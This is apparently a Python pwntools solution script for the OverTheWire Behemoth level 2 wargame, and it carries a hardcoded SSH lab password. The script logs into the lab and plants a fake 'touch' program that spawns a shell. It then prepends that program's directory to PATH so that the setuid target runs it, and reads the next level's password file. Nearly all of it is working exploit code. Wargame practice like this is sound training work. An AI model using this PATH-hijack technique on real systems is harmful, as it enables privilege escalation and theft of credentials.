from pwn import *


'''
The main thing here is system('touch 34324');
`touch` isn't checked if it is a different binary or script.
So, you can create your own touch and import path in the env PATH variable
'''
con = ssh('behemoth2', 'behemoth.labs.overthewire.org', password='eimahquuof', port=2221)
sh = con.process('sh')
sh.sendline('mkdir -p /tmp/beh2 && cd /tmp/beh2')
sh.sendline('echo "/bin/sh" > /tmp/beh2/touch')
sh.sendline('chmod +x /tmp/beh2/touch')
sh.sendline('PATH=/tmp/beh2:$PATH')
sh.sendline('echo "cat /etc/behemoth_pass/behemoth3" | /behemoth/behemoth2')
sh.recv()
sh.recv()
sh.recv()
sh.recv()
print(sh.recv())
